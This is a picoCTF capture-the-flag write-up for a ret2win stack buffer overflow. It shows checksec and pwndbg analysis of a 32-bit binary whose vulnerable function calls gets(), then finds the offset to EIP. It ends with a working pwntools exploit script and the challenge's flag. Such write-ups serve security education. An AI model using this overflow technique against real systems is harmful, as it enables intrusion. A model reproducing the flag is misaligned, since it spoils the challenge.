---
title: Buffer Overflow 1
date: 2025-12-05 12:00:00
categories: [CTF, binary exploitation]
tags: [writeup, picoctf]
---

## Сhallenge Info
* Platform: picoCTF
* Category: binary exploitation
* Diffuculty: medium

## Challenge Description
Control the return address Now we're cooking! You can overflow the buffer and return to the flag function in the [program](https://artifacts.picoctf.net/c/187/vuln). You can view source [here](https://artifacts.picoctf.net/c/187/vuln.c). And connect with it using nc saturn.picoctf.net 58744

## Solution
Let's start by analyzing binary first:
```bash
┌──(kali㉿kali)-[~/picoCTF/pwn/bof_1]
└─$ file vuln    
vuln: ELF 32-bit LSB executable, Intel i386, version 1 (SYSV), dynamically linked, interpreter /lib/ld-linux.so.2, BuildID[sha1]=685b06b911b19065f27c2d369c18ed09fbadb543, for GNU/Linux 3.2.0, not stripped
                                                                                                                                             
┌──(kali㉿kali)-[~/picoCTF/pwn/bof_1]
└─$ checksec --file=vuln    
RELRO           STACK CANARY      NX            PIE             RPATH      RUNPATH      Symbols         FORTIFY Fortified       Fortifiable FILE
Partial RELRO   No canary found   NX disabled   No PIE          No RPATH   No RUNPATH   76 Symbols        No    0               3           vuln     
```
So, it's a 32 bit binary without Canary, NX, and PIE. This binary is vulnerable to pretty much everything. Let's run to see how it works:
```bash
┌──(kali㉿kali)-[~/picoCTF/pwn/bof_1]
└─$ ./vuln 
Please enter your string: 
AAAABBBBCCCC
Okay, time to return... Fingers Crossed... Jumping to 0x804932f
```
It asks us for a string and then jumps to the address 0x804932f

Let's analyze the source code to get the complete picture:
```c
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>
#include <sys/types.h>
#include "asm.h"

#define BUFSIZE 32
#define FLAGSIZE 64

void win() {
  char buf[FLAGSIZE];
  FILE *f = fopen("flag.txt","r");
  if (f == NULL) {
    printf("%s %s", "Please create 'flag.txt' in this directory with your",
                    "own debugging flag.\n");
    exit(0);
  }

  fgets(buf,FLAGSIZE,f);
  printf(buf);
}

void vuln(){
  char buf[BUFSIZE];
  gets(buf);

  printf("Okay, time to return... Fingers Crossed... Jumping to 0x%x\n", get_return_address());
}

int main(int argc, char **argv){

  setvbuf(stdout, NULL, _IONBF, 0);
  
  gid_t gid = getegid();
  setresgid(gid, gid, gid);

  puts("Please enter your string: ");
  vuln();
  return 0;
}
```
It's a classic ret2win chall with buffer overflow. Our goal is to overwrite EIP with the address of win. First, we need to determine the offset to EIP.

Let's use debugger for it:
```bash
┌──(kali㉿kali)-[~/picoCTF/pwn/bof_1]
└─$ pwndbg vuln
```
Now we need to set a breakpoint
```bash
pwndbg> disassemble main
Dump of assembler code for function main:
   0x080492c4 <+0>:     endbr32
   0x080492c8 <+4>:     lea    ecx,[esp+0x4]
   0x080492cc <+8>:     and    esp,0xfffffff0
   ...
   ...
   ...
   0x0804933d <+121>:   ret
End of assembler dump.
```
That's the line we need 0x0804933d <+121>:   ret, let's set a breakpoint there:
```bash
pwndbg> b *0x0804933d
Breakpoint 1 at 0x804933d
```
Now, generate pattern using cyclic:
```bash
pwndbg> cyclic 100
aaaabaaacaaadaaaeaaafaaagaaahaaaiaaajaaakaaalaaamaaanaaaoaaapaaaqaaaraaasaaataaauaaavaaawaaaxaaayaaa
```
Run the program with our cyclic pattern and check our registers:
```bash
pwndbg> r
Starting program: /home/kali/picoCTF/pwn/bof_1/vuln 
warning: Unable to find libthread_db matching inferior's thread library, thread debugging will not be available.
Please enter your string: 
aaaabaaacaaadaaaeaaafaaagaaahaaaiaaajaaakaaalaaamaaanaaaoaaapaaaqaaaraaasaaataaauaaavaaawaaaxaaayaaa
Okay, time to return... Fingers Crossed... Jumping to 0x6161616c

Program received signal SIGSEGV, Segmentation fault.
0x6161616c in ?? ()
LEGEND: STACK | HEAP | CODE | DATA | WX | RODATA
───────────────────────────────────────────[ REGISTERS / show-flags off / show-compact-regs off ]────────────────────────────────────────────
 EAX  0x41
 EBX  0x6161616a ('jaaa')
 ECX  0
 EDX  0
 EDI  0xf7ffcc60 (_rtld_global_ro) ◂— 0
 ESI  0x8049350 (__libc_csu_init) ◂— endbr32 
 EBP  0x6161616b ('kaaa')
 ESP  0xffffcdf0 ◂— 'maaanaaaoaaapaaaqaaaraaasaaataaauaaavaaawaaaxaaayaaa'
 EIP  0x6161616c ('laaa')
─────────────────────────────────────────────────────[ DISASM / i386 / set emulate on ]──────────────────────────────────────────────────────
Invalid address 0x6161616c
```
As we can see, we overwrote buffer and the overwrote saved EIP. After overwriting it with 'laaa', program tried to return to that address, but couldn't and thus we got sigsegv.
To get the offset to EIP, use cyclic -l:
```bash
pwndbg> cyclic -l laaa
Finding cyclic pattern of 4 bytes: b'laaa' (hex: 0x6c616161)
Found at offset 44
```
Offset to EIP is 44, great. Now let's get the address of win function, and since PIE is disabled the address will always stay the same:
```bash
pwndbg> disassemble win
Dump of assembler code for function win:
   0x080491f6 <+0>:     endbr32
```
Address of win is 0x80491f6, now let's write our exploit!

## Exploit
```python
from pwn import *

r = remote('saturn.picoctf.net', 58461)
context.binary = './vuln'

win = 0x80491f6

padding = b"A" * 44 # Padding to EIP

payload = padding # Overwrite buffer and other registers 
payload += p32(win) # Overwrite EIP with the address of win

r.sendline(payload)

r.interactive()
```
Run it:
```bash
python3 exploit.py
```
And get the flag:
```bash
[*] Switching to interactive mode
Please enter your string: 
Okay, time to return... Fingers Crossed... Jumping to 0x80491f6
picoCTF{addr3ss3s_ar3_3asy_b15b081e}[*] Got EOF while reading in interactive
```

## Flag
```
picoCTF{addr3ss3s_ar3_3asy_b15b081e}
```
